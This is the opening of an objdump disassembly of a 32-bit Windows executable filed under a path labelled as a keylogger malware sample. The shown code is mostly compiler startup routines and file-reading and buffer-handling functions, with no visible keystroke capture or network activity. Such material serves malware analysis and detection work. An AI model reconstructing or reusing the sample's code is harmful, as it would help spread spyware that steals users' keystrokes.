
malware_samples/keylogger/5ea7f3902dd5e42f07d812c96f2ee8d9cf6f381b2e6b2833680690fdf69e40c0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	f3 c3                	repz ret
  401002:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401009:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401010:	83 ec 1c             	sub    $0x1c,%esp
  401013:	31 c0                	xor    %eax,%eax
  401015:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  40101c:	4d 5a 
  40101e:	c7 05 cc e2 41 00 01 	movl   $0x1,0x41e2cc
  401025:	00 00 00 
  401028:	c7 05 c8 e2 41 00 01 	movl   $0x1,0x41e2c8
  40102f:	00 00 00 
  401032:	c7 05 c4 e2 41 00 01 	movl   $0x1,0x41e2c4
  401039:	00 00 00 
  40103c:	c7 05 d4 e2 41 00 01 	movl   $0x1,0x41e2d4
  401043:	00 00 00 
  401046:	74 68                	je     0x4010b0
  401048:	a3 08 20 41 00       	mov    %eax,0x412008
  40104d:	a1 d8 e2 41 00       	mov    0x41e2d8,%eax
  401052:	85 c0                	test   %eax,%eax
  401054:	74 4a                	je     0x4010a0
  401056:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40105d:	e8 be 97 00 00       	call   0x40a820
  401062:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  401069:	e8 62 86 00 00       	call   0x4096d0
  40106e:	8b 15 dc e2 41 00    	mov    0x41e2dc,%edx
  401074:	a3 78 e6 41 00       	mov    %eax,0x41e678
  401079:	a3 7c e6 41 00       	mov    %eax,0x41e67c
  40107e:	a1 f0 f2 41 00       	mov    0x41f2f0,%eax
  401083:	89 10                	mov    %edx,(%eax)
  401085:	e8 86 88 00 00       	call   0x409910
  40108a:	83 3d 20 b0 40 00 01 	cmpl   $0x1,0x40b020
  401091:	74 6d                	je     0x401100
  401093:	31 c0                	xor    %eax,%eax
  401095:	83 c4 1c             	add    $0x1c,%esp
  401098:	c3                   	ret
  401099:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4010a0:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4010a7:	e8 74 97 00 00       	call   0x40a820
  4010ac:	eb b4                	jmp    0x401062
  4010ae:	66 90                	xchg   %ax,%ax
  4010b0:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  4010b6:	81 ba 00 00 40 00 50 	cmpl   $0x4550,0x400000(%edx)
  4010bd:	45 00 00 
  4010c0:	8d 8a 00 00 40 00    	lea    0x400000(%edx),%ecx
  4010c6:	75 80                	jne    0x401048
  4010c8:	0f b7 51 18          	movzwl 0x18(%ecx),%edx
  4010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
  4010d1:	74 3f                	je     0x401112
  4010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
  4010d8:	0f 85 6a ff ff ff    	jne    0x401048
  4010de:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%ecx)
  4010e5:	0f 86 5d ff ff ff    	jbe    0x401048
  4010eb:	8b 91 f8 00 00 00    	mov    0xf8(%ecx),%edx
  4010f1:	31 c0                	xor    %eax,%eax
  4010f3:	85 d2                	test   %edx,%edx
  4010f5:	0f 95 c0             	setne  %al
  4010f8:	e9 4b ff ff ff       	jmp    0x401048
  4010fd:	8d 76 00             	lea    0x0(%esi),%esi
  401100:	c7 04 24 80 99 40 00 	movl   $0x409980,(%esp)
  401107:	e8 64 88 00 00       	call   0x409970
  40110c:	31 c0                	xor    %eax,%eax
  40110e:	83 c4 1c             	add    $0x1c,%esp
  401111:	c3                   	ret
  401112:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401116:	0f 86 2c ff ff ff    	jbe    0x401048
  40111c:	8b 89 e8 00 00 00    	mov    0xe8(%ecx),%ecx
  401122:	31 c0                	xor    %eax,%eax
  401124:	85 c9                	test   %ecx,%ecx
  401126:	0f 95 c0             	setne  %al
  401129:	e9 1a ff ff ff       	jmp    0x401048
  40112e:	66 90                	xchg   %ax,%ax
  401130:	83 ec 2c             	sub    $0x2c,%esp
  401133:	a1 e0 e2 41 00       	mov    0x41e2e0,%eax
  401138:	c7 44 24 10 00 20 41 	movl   $0x412000,0x10(%esp)
  40113f:	00 
  401140:	c7 44 24 08 14 20 41 	movl   $0x412014,0x8(%esp)
  401147:	00 
  401148:	c7 44 24 04 18 20 41 	movl   $0x412018,0x4(%esp)
  40114f:	00 
  401150:	a3 00 20 41 00       	mov    %eax,0x412000
  401155:	a1 0c b0 40 00       	mov    0x40b00c,%eax
  40115a:	c7 04 24 1c 20 41 00 	movl   $0x41201c,(%esp)
  401161:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401165:	e8 be 96 00 00       	call   0x40a828
  40116a:	a3 10 20 41 00       	mov    %eax,0x412010
  40116f:	83 c4 2c             	add    $0x2c,%esp
  401172:	c3                   	ret
  401173:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401179:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401180:	55                   	push   %ebp
  401181:	31 c0                	xor    %eax,%eax
  401183:	89 e5                	mov    %esp,%ebp
  401185:	b9 11 00 00 00       	mov    $0x11,%ecx
  40118a:	57                   	push   %edi
  40118b:	56                   	push   %esi
  40118c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40118f:	53                   	push   %ebx
  401190:	89 d7                	mov    %edx,%edi
  401192:	83 ec 7c             	sub    $0x7c,%esp
  401195:	f3 ab                	rep stos %eax,%es:(%edi)
  401197:	b0 30                	mov    $0x30,%al
  401199:	e8 42 94 00 00       	call   0x40a5e0
  40119e:	29 c4                	sub    %eax,%esp
  4011a0:	8d 44 24 1b          	lea    0x1b(%esp),%eax
  4011a4:	83 e0 f0             	and    $0xfffffff0,%eax
  4011a7:	c7 00 cc cc cc cc    	movl   $0xcccccccc,(%eax)
  4011ad:	c7 40 04 cc cc cc cc 	movl   $0xcccccccc,0x4(%eax)
  4011b4:	c7 40 08 cc cc cc cc 	movl   $0xcccccccc,0x8(%eax)
  4011bb:	c7 40 0c cc cc cc cc 	movl   $0xcccccccc,0xc(%eax)
  4011c2:	c7 40 10 cc cc cc cc 	movl   $0xcccccccc,0x10(%eax)
  4011c9:	c7 40 14 cc cc cc cc 	movl   $0xcccccccc,0x14(%eax)
  4011d0:	c7 40 18 cc cc cc cc 	movl   $0xcccccccc,0x18(%eax)
  4011d7:	c7 40 1c cc cc cc cc 	movl   $0xcccccccc,0x1c(%eax)
  4011de:	83 e4 f0             	and    $0xfffffff0,%esp
  4011e1:	8b 35 d8 e2 41 00    	mov    0x41e2d8,%esi
  4011e7:	85 f6                	test   %esi,%esi
  4011e9:	0f 85 98 02 00 00    	jne    0x401487
  4011ef:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  4011f5:	31 f6                	xor    %esi,%esi
  4011f7:	8b 58 04             	mov    0x4(%eax),%ebx
  4011fa:	8b 3d 94 f2 41 00    	mov    0x41f294,%edi
  401200:	eb 14                	jmp    0x401216
  401202:	39 d8                	cmp    %ebx,%eax
  401204:	0f 84 1f 02 00 00    	je     0x401429
  40120a:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  401211:	ff d7                	call   *%edi
  401213:	83 ec 04             	sub    $0x4,%esp
  401216:	89 f0                	mov    %esi,%eax
  401218:	f0 0f b1 1d 80 e6 41 	lock cmpxchg %ebx,0x41e680
  40121f:	00 
  401220:	85 c0                	test   %eax,%eax
  401222:	75 de                	jne    0x401202
  401224:	a1 84 e6 41 00       	mov    0x41e684,%eax
  401229:	31 db                	xor    %ebx,%ebx
  40122b:	83 f8 01             	cmp    $0x1,%eax
  40122e:	0f 84 08 02 00 00    	je     0x40143c
  401234:	a1 84 e6 41 00       	mov    0x41e684,%eax
  401239:	85 c0                	test   %eax,%eax
  40123b:	0f 84 57 02 00 00    	je     0x401498
  401241:	c7 05 04 20 41 00 01 	movl   $0x1,0x412004
  401248:	00 00 00 
  40124b:	a1 84 e6 41 00       	mov    0x41e684,%eax
  401250:	83 f8 01             	cmp    $0x1,%eax
  401253:	0f 84 fd 01 00 00    	je     0x401456
  401259:	85 db                	test   %ebx,%ebx
  40125b:	0f 84 1b 02 00 00    	je     0x40147c
  401261:	a1 50 02 41 00       	mov    0x410250,%eax
  401266:	85 c0                	test   %eax,%eax
  401268:	74 1c                	je     0x401286
  40126a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401271:	00 
  401272:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401279:	00 
  40127a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401281:	ff d0                	call   *%eax
  401283:	83 ec 0c             	sub    $0xc,%esp
  401286:	e8 f5 88 00 00       	call   0x409b80
  40128b:	c7 04 24 c0 97 40 00 	movl   $0x4097c0,(%esp)
  401292:	ff 15 90 f2 41 00    	call   *0x41f290
  401298:	83 ec 04             	sub    $0x4,%esp
  40129b:	a3 e4 e2 41 00       	mov    %eax,0x41e2e4
  4012a0:	c7 04 24 00 10 40 00 	movl   $0x401000,(%esp)
  4012a7:	e8 94 95 00 00       	call   0x40a840
  4012ac:	e8 6f 8b 00 00       	call   0x409e20
  4012b1:	a1 30 f3 41 00       	mov    0x41f330,%eax
  4012b6:	c7 05 6c e6 41 00 00 	movl   $0x400000,0x41e66c
  4012bd:	00 40 00 
  4012c0:	8b 00                	mov    (%eax),%eax
  4012c2:	85 c0                	test   %eax,%eax
  4012c4:	74 46                	je     0x40130c
  4012c6:	31 c9                	xor    %ecx,%ecx
  4012c8:	eb 17                	jmp    0x4012e1
  4012ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4012d0:	66 85 d2             	test   %dx,%dx
  4012d3:	74 32                	je     0x401307
  4012d5:	85 c9                	test   %ecx,%ecx
  4012d7:	74 1f                	je     0x4012f8
  4012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012de:	83 c0 02             	add    $0x2,%eax
  4012e1:	0f b7 10             	movzwl (%eax),%edx
  4012e4:	66 83 fa 20          	cmp    $0x20,%dx
  4012e8:	76 e6                	jbe    0x4012d0
  4012ea:	89 cb                	mov    %ecx,%ebx
  4012ec:	83 f3 01             	xor    $0x1,%ebx
  4012ef:	66 83 fa 22          	cmp    $0x22,%dx
  4012f3:	0f 44 cb             	cmove  %ebx,%ecx
  4012f6:	eb e6                	jmp    0x4012de
  4012f8:	83 c0 02             	add    $0x2,%eax
  4012fb:	0f b7 38             	movzwl (%eax),%edi
  4012fe:	8d 57 ff             	lea    -0x1(%edi),%edx
  401301:	66 83 fa 1f          	cmp    $0x1f,%dx
  401305:	76 f1                	jbe    0x4012f8
  401307:	a3 68 e6 41 00       	mov    %eax,0x41e668
  40130c:	8b 1d d8 e2 41 00    	mov    0x41e2d8,%ebx
  401312:	85 db                	test   %ebx,%ebx
  401314:	74 15                	je     0x40132b
  401316:	0f b7 55 d4          	movzwl -0x2c(%ebp),%edx
  40131a:	b8 0a 00 00 00       	mov    $0xa,%eax
  40131f:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  401323:	0f 45 c2             	cmovne %edx,%eax
  401326:	a3 00 b0 40 00       	mov    %eax,0x40b000
  40132b:	a1 1c 20 41 00       	mov    0x41201c,%eax
  401330:	89 45 90             	mov    %eax,-0x70(%ebp)
  401333:	89 c7                	mov    %eax,%edi
  401335:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40133c:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40133f:	89 04 24             	mov    %eax,(%esp)
  401342:	e8 09 95 00 00       	call   0x40a850
  401347:	85 ff                	test   %edi,%edi
  401349:	8b 1d 18 20 41 00    	mov    0x412018,%ebx
  40134f:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401352:	0f 8e 63 01 00 00    	jle    0x4014bb
  401358:	31 ff                	xor    %edi,%edi
  40135a:	89 fe                	mov    %edi,%esi
  40135c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401360:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  401363:	66 83 38 00          	cmpw   $0x0,(%eax)
  401367:	0f 84 b2 00 00 00    	je     0x40141f
  40136d:	b9 01 00 00 00       	mov    $0x1,%ecx
  401372:	83 c1 01             	add    $0x1,%ecx
  401375:	66 83 7c 48 fe 00    	cmpw   $0x0,-0x2(%eax,%ecx,2)
  40137b:	75 f5                	jne    0x401372
  40137d:	8d 3c 09             	lea    (%ecx,%ecx,1),%edi
  401380:	89 3c 24             	mov    %edi,(%esp)
  401383:	e8 c8 94 00 00       	call   0x40a850
  401388:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40138b:	89 04 b2             	mov    %eax,(%edx,%esi,4)
  40138e:	8b 14 b3             	mov    (%ebx,%esi,4),%edx
  401391:	83 c6 01             	add    $0x1,%esi
  401394:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401398:	89 04 24             	mov    %eax,(%esp)
  40139b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40139f:	e8 b4 94 00 00       	call   0x40a858
  4013a4:	3b 75 90             	cmp    -0x70(%ebp),%esi
  4013a7:	75 b7                	jne    0x401360
  4013a9:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4013ac:	83 e8 04             	sub    $0x4,%eax
  4013af:	8b 7d 94             	mov    -0x6c(%ebp),%edi
  4013b2:	c7 04 07 00 00 00 00 	movl   $0x0,(%edi,%eax,1)
  4013b9:	89 3d 18 20 41 00    	mov    %edi,0x412018
  4013bf:	e8 ec 8a 00 00       	call   0x409eb0
  4013c4:	a1 d4 f2 41 00       	mov    0x41f2d4,%eax
  4013c9:	8b 15 14 20 41 00    	mov    0x412014,%edx
  4013cf:	89 10                	mov    %edx,(%eax)
  4013d1:	a1 14 20 41 00       	mov    0x412014,%eax
  4013d6:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013da:	a1 18 20 41 00       	mov    0x412018,%eax
  4013df:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013e3:	a1 1c 20 41 00       	mov    0x41201c,%eax
  4013e8:	89 04 24             	mov    %eax,(%esp)
  4013eb:	e8 e0 8a 00 00       	call   0x409ed0
  4013f0:	8b 0d 08 20 41 00    	mov    0x412008,%ecx
  4013f6:	85 c9                	test   %ecx,%ecx
  4013f8:	a3 0c 20 41 00       	mov    %eax,0x41200c
  4013fd:	0f 84 bf 00 00 00    	je     0x4014c2
  401403:	8b 15 04 20 41 00    	mov    0x412004,%edx
  401409:	85 d2                	test   %edx,%edx
  40140b:	75 0a                	jne    0x401417
  40140d:	e8 4e 94 00 00       	call   0x40a860
  401412:	a1 0c 20 41 00       	mov    0x41200c,%eax
  401417:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40141a:	5b                   	pop    %ebx
  40141b:	5e                   	pop    %esi
  40141c:	5f                   	pop    %edi
  40141d:	5d                   	pop    %ebp
  40141e:	c3                   	ret
  40141f:	bf 02 00 00 00       	mov    $0x2,%edi
  401424:	e9 57 ff ff ff       	jmp    0x401380
  401429:	a1 84 e6 41 00       	mov    0x41e684,%eax
  40142e:	bb 01 00 00 00       	mov    $0x1,%ebx
  401433:	83 f8 01             	cmp    $0x1,%eax
  401436:	0f 85 f8 fd ff ff    	jne    0x401234
  40143c:	c7 04 24 1f 00 00 00 	movl   $0x1f,(%esp)
  401443:	e8 20 94 00 00       	call   0x40a868
  401448:	a1 84 e6 41 00       	mov    0x41e684,%eax
  40144d:	83 f8 01             	cmp    $0x1,%eax
  401450:	0f 85 03 fe ff ff    	jne    0x401259
  401456:	c7 44 24 04 08 00 42 	movl   $0x420008,0x4(%esp)
  40145d:	00 
  40145e:	c7 04 24 00 00 42 00 	movl   $0x420000,(%esp)
  401465:	e8 06 94 00 00       	call   0x40a870
  40146a:	85 db                	test   %ebx,%ebx
  40146c:	c7 05 84 e6 41 00 02 	movl   $0x2,0x41e684
  401473:	00 00 00 
  401476:	0f 85 e5 fd ff ff    	jne    0x401261
  40147c:	87 1d 80 e6 41 00    	xchg   %ebx,0x41e680
  401482:	e9 da fd ff ff       	jmp    0x401261
  401487:	89 14 24             	mov    %edx,(%esp)
  40148a:	ff 15 60 f2 41 00    	call   *0x41f260
  401490:	83 ec 04             	sub    $0x4,%esp
  401493:	e9 57 fd ff ff       	jmp    0x4011ef
  401498:	c7 05 84 e6 41 00 01 	movl   $0x1,0x41e684
  40149f:	00 00 00 
  4014a2:	c7 44 24 04 18 00 42 	movl   $0x420018,0x4(%esp)
  4014a9:	00 
  4014aa:	c7 04 24 0c 00 42 00 	movl   $0x42000c,(%esp)
  4014b1:	e8 ba 93 00 00       	call   0x40a870
  4014b6:	e9 90 fd ff ff       	jmp    0x40124b
  4014bb:	31 c0                	xor    %eax,%eax
  4014bd:	e9 ed fe ff ff       	jmp    0x4013af
  4014c2:	89 04 24             	mov    %eax,(%esp)
  4014c5:	e8 ae 93 00 00       	call   0x40a878
  4014ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014d0:	83 ec 0c             	sub    $0xc,%esp
  4014d3:	c7 05 d8 e2 41 00 01 	movl   $0x1,0x41e2d8
  4014da:	00 00 00 
  4014dd:	e8 2e 8a 00 00       	call   0x409f10
  4014e2:	83 c4 0c             	add    $0xc,%esp
  4014e5:	e9 96 fc ff ff       	jmp    0x401180
  4014ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4014f0:	83 ec 0c             	sub    $0xc,%esp
  4014f3:	c7 05 d8 e2 41 00 00 	movl   $0x0,0x41e2d8
  4014fa:	00 00 00 
  4014fd:	e8 0e 8a 00 00       	call   0x409f10
  401502:	83 c4 0c             	add    $0xc,%esp
  401505:	e9 76 fc ff ff       	jmp    0x401180
  40150a:	90                   	nop
  40150b:	90                   	nop
  40150c:	90                   	nop
  40150d:	90                   	nop
  40150e:	90                   	nop
  40150f:	90                   	nop
  401510:	83 ec 1c             	sub    $0x1c,%esp
  401513:	a1 cc f2 41 00       	mov    0x41f2cc,%eax
  401518:	8b 00                	mov    (%eax),%eax
  40151a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40151e:	a1 b8 f2 41 00       	mov    0x41f2b8,%eax
  401523:	8b 00                	mov    (%eax),%eax
  401525:	89 04 24             	mov    %eax,(%esp)
  401528:	e8 43 3c 00 00       	call   0x405170
  40152d:	89 44 24 04          	mov    %eax,0x4(%esp)
  401531:	a1 b8 f2 41 00       	mov    0x41f2b8,%eax
  401536:	8b 00                	mov    (%eax),%eax
  401538:	89 04 24             	mov    %eax,(%esp)
  40153b:	e8 40 12 00 00       	call   0x402780
  401540:	83 c4 1c             	add    $0x1c,%esp
  401543:	c2 10 00             	ret    $0x10
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop
  401550:	57                   	push   %edi
  401551:	56                   	push   %esi
  401552:	83 ea 58             	sub    $0x58,%edx
  401555:	53                   	push   %ebx
  401556:	89 c3                	mov    %eax,%ebx
  401558:	83 ec 10             	sub    $0x10,%esp
  40155b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401562:	00 
  401563:	89 54 24 04          	mov    %edx,0x4(%esp)
  401567:	8b 00                	mov    (%eax),%eax
  401569:	89 04 24             	mov    %eax,(%esp)
  40156c:	e8 0f 93 00 00       	call   0x40a880
  401571:	85 c0                	test   %eax,%eax
  401573:	75 40                	jne    0x4015b5
  401575:	8b 03                	mov    (%ebx),%eax
  401577:	8d 73 10             	lea    0x10(%ebx),%esi
  40157a:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401581:	00 
  401582:	c7 44 24 04 58 00 00 	movl   $0x58,0x4(%esp)
  401589:	00 
  40158a:	89 34 24             	mov    %esi,(%esp)
  40158d:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401591:	e8 f2 92 00 00       	call   0x40a888
  401596:	85 c0                	test   %eax,%eax
  401598:	74 1b                	je     0x4015b5
  40159a:	bf 00 c0 40 00       	mov    $0x40c000,%edi
  40159f:	b9 08 00 00 00       	mov    $0x8,%ecx
  4015a4:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4015a6:	0f 95 c0             	setne  %al
  4015a9:	83 c4 10             	add    $0x10,%esp
  4015ac:	0f b6 c0             	movzbl %al,%eax
  4015af:	5b                   	pop    %ebx
  4015b0:	f7 d8                	neg    %eax
  4015b2:	5e                   	pop    %esi
  4015b3:	5f                   	pop    %edi
  4015b4:	c3                   	ret
  4015b5:	83 c4 10             	add    $0x10,%esp
  4015b8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4015bd:	5b                   	pop    %ebx
  4015be:	5e                   	pop    %esi
  4015bf:	5f                   	pop    %edi
  4015c0:	c3                   	ret
  4015c1:	eb 0d                	jmp    0x4015d0
  4015c3:	90                   	nop
  4015c4:	90                   	nop
  4015c5:	90                   	nop
  4015c6:	90                   	nop
  4015c7:	90                   	nop
  4015c8:	90                   	nop
  4015c9:	90                   	nop
  4015ca:	90                   	nop
  4015cb:	90                   	nop
  4015cc:	90                   	nop
  4015cd:	90                   	nop
  4015ce:	90                   	nop
  4015cf:	90                   	nop
  4015d0:	56                   	push   %esi
  4015d1:	53                   	push   %ebx
  4015d2:	83 ec 14             	sub    $0x14,%esp
  4015d5:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4015d9:	8b 74 24 20          	mov    0x20(%esp),%esi
  4015dd:	8b 03                	mov    (%ebx),%eax
  4015df:	89 04 24             	mov    %eax,(%esp)
  4015e2:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  4015e8:	83 ec 04             	sub    $0x4,%esp
  4015eb:	01 d8                	add    %ebx,%eax
  4015ed:	3b 46 08             	cmp    0x8(%esi),%eax
  4015f0:	73 0f                	jae    0x401601
  4015f2:	c7 04 24 0c c0 40 00 	movl   $0x40c00c,(%esp)
  4015f9:	e8 12 08 00 00       	call   0x401e10
  4015fe:	8b 46 0c             	mov    0xc(%esi),%eax
  401601:	83 c4 14             	add    $0x14,%esp
  401604:	5b                   	pop    %ebx
  401605:	5e                   	pop    %esi
  401606:	c3                   	ret
  401607:	89 f6                	mov    %esi,%esi
  401609:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401610:	55                   	push   %ebp
  401611:	57                   	push   %edi
  401612:	56                   	push   %esi
  401613:	53                   	push   %ebx
  401614:	83 ec 6c             	sub    $0x6c,%esp
  401617:	8b 9c 24 80 00 00 00 	mov    0x80(%esp),%ebx
  40161e:	8b bc 24 84 00 00 00 	mov    0x84(%esp),%edi
  401625:	8b 03                	mov    (%ebx),%eax
  401627:	85 c0                	test   %eax,%eax
  401629:	0f 84 61 01 00 00    	je     0x401790
  40162f:	8b 73 04             	mov    0x4(%ebx),%esi
  401632:	8b 47 04             	mov    0x4(%edi),%eax
  401635:	8b 2d d4 f3 41 00    	mov    0x41f3d4,%ebp
  40163b:	89 04 24             	mov    %eax,(%esp)
  40163e:	ff d5                	call   *%ebp
  401640:	83 ec 04             	sub    $0x4,%esp
  401643:	01 c6                	add    %eax,%esi
  401645:	89 74 24 04          	mov    %esi,0x4(%esp)
  401649:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401650:	00 
  401651:	8b 03                	mov    (%ebx),%eax
  401653:	89 04 24             	mov    %eax,(%esp)
  401656:	e8 25 92 00 00       	call   0x40a880
  40165b:	8b 47 08             	mov    0x8(%edi),%eax
  40165e:	89 04 24             	mov    %eax,(%esp)
  401661:	ff d5                	call   *%ebp
  401663:	83 ec 04             	sub    $0x4,%esp
  401666:	89 04 24             	mov    %eax,(%esp)
  401669:	e8 e2 91 00 00       	call   0x40a850
  40166e:	85 c0                	test   %eax,%eax
  401670:	89 c6                	mov    %eax,%esi
  401672:	0f 84 5b 01 00 00    	je     0x4017d3
  401678:	8b 13                	mov    (%ebx),%edx
  40167a:	8b 47 08             	mov    0x8(%edi),%eax
  40167d:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  401681:	89 04 24             	mov    %eax,(%esp)
  401684:	ff d5                	call   *%ebp
  401686:	83 ec 04             	sub    $0x4,%esp
  401689:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40168d:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401694:	00 
  401695:	89 44 24 04          	mov    %eax,0x4(%esp)
  401699:	89 34 24             	mov    %esi,(%esp)
  40169c:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4016a0:	e8 e3 91 00 00       	call   0x40a888
  4016a5:	85 c0                	test   %eax,%eax
  4016a7:	0f 84 13 01 00 00    	je     0x4017c0
  4016ad:	80 7f 10 01          	cmpb   $0x1,0x10(%edi)
  4016b1:	74 1e                	je     0x4016d1
  4016b3:	8b 03                	mov    (%ebx),%eax
  4016b5:	85 c0                	test   %eax,%eax
  4016b7:	74 0e                	je     0x4016c7
  4016b9:	89 04 24             	mov    %eax,(%esp)
  4016bc:	e8 cf 91 00 00       	call   0x40a890
  4016c1:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4016c7:	83 c4 6c             	add    $0x6c,%esp
  4016ca:	89 f0                	mov    %esi,%eax
  4016cc:	5b                   	pop    %ebx
  4016cd:	5e                   	pop    %esi
  4016ce:	5f                   	pop    %edi
  4016cf:	5d                   	pop    %ebp
  4016d0:	c3                   	ret
  4016d1:	e8 7a 40 00 00       	call   0x405750
  4016d6:	8b 47 0c             	mov    0xc(%edi),%eax
  4016d9:	89 04 24             	mov    %eax,(%esp)
  4016dc:	ff d5                	call   *%ebp
  4016de:	83 ec 04             	sub    $0x4,%esp
  4016e1:	89 04 24             	mov    %eax,(%esp)
  4016e4:	e8 67 91 00 00       	call   0x40a850
  4016e9:	85 c0                	test   %eax,%eax
  4016eb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4016ef:	0f 84 45 01 00 00    	je     0x40183a
  4016f5:	8b 47 08             	mov    0x8(%edi),%eax
  4016f8:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  4016ff:	00 
  401700:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%esp)
  401707:	00 
  401708:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%esp)
  40170f:	00 
  401710:	89 74 24 28          	mov    %esi,0x28(%esp)
  401714:	89 04 24             	mov    %eax,(%esp)
  401717:	ff d5                	call   *%ebp
  401719:	83 ec 04             	sub    $0x4,%esp
  40171c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401720:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401724:	89 44 24 34          	mov    %eax,0x34(%esp)
  401728:	8b 47 0c             	mov    0xc(%edi),%eax
  40172b:	89 04 24             	mov    %eax,(%esp)
  40172e:	ff d5                	call   *%ebp
  401730:	83 ec 04             	sub    $0x4,%esp
  401733:	8d 6c 24 28          	lea    0x28(%esp),%ebp
  401737:	c7 44 24 08 38 00 00 	movl   $0x38,0x8(%esp)
  40173e:	00 
  40173f:	c7 44 24 04 93 c0 40 	movl   $0x40c093,0x4(%esp)
  401746:	00 
  401747:	89 44 24 38          	mov    %eax,0x38(%esp)
  40174b:	89 2c 24             	mov    %ebp,(%esp)
  40174e:	e8 bd 44 00 00       	call   0x405c10
  401753:	85 c0                	test   %eax,%eax
  401755:	0f 88 8b 00 00 00    	js     0x4017e6
  40175b:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401762:	00 
  401763:	89 2c 24             	mov    %ebp,(%esp)
  401766:	e8 45 45 00 00       	call   0x405cb0
  40176b:	85 c0                	test   %eax,%eax
  40176d:	0f 88 ad 00 00 00    	js     0x401820
  401773:	89 2c 24             	mov    %ebp,(%esp)
  401776:	e8 05 64 00 00       	call   0x407b80
  40177b:	89 34 24             	mov    %esi,(%esp)
  40177e:	e8 15 91 00 00       	call   0x40a898
  401783:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401787:	e9 27 ff ff ff       	jmp    0x4016b3
  40178c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401790:	8d 43 68             	lea    0x68(%ebx),%eax
  401793:	c7 44 24 04 2c c0 40 	movl   $0x40c02c,0x4(%esp)
  40179a:	00 
  40179b:	89 04 24             	mov    %eax,(%esp)
  40179e:	e8 cd 16 00 00       	call   0x402e70
  4017a3:	85 c0                	test   %eax,%eax
  4017a5:	89 03                	mov    %eax,(%ebx)
  4017a7:	0f 85 82 fe ff ff    	jne    0x40162f
  4017ad:	c7 04 24 d3 c0 40 00 	movl   $0x40c0d3,(%esp)
  4017b4:	31 f6                	xor    %esi,%esi
  4017b6:	e8 b5 06 00 00       	call   0x401e70
  4017bb:	e9 07 ff ff ff       	jmp    0x4016c7
  4017c0:	c7 04 24 50 c0 40 00 	movl   $0x40c050,(%esp)
  4017c7:	31 f6                	xor    %esi,%esi
  4017c9:	e8 a2 06 00 00       	call   0x401e70
  4017ce:	e9 f4 fe ff ff       	jmp    0x4016c7
  4017d3:	c7 04 24 30 c0 40 00 	movl   $0x40c030,(%esp)
  4017da:	31 f6                	xor    %esi,%esi
  4017dc:	e8 8f 06 00 00       	call   0x401e70
  4017e1:	e9 e1 fe ff ff       	jmp    0x4016c7
  4017e6:	8b 54 24 40          	mov    0x40(%esp),%edx
  4017ea:	89 44 24 04          	mov    %eax,0x4(%esp)
  4017ee:	c7 04 24 b4 c0 40 00 	movl   $0x40c0b4,(%esp)
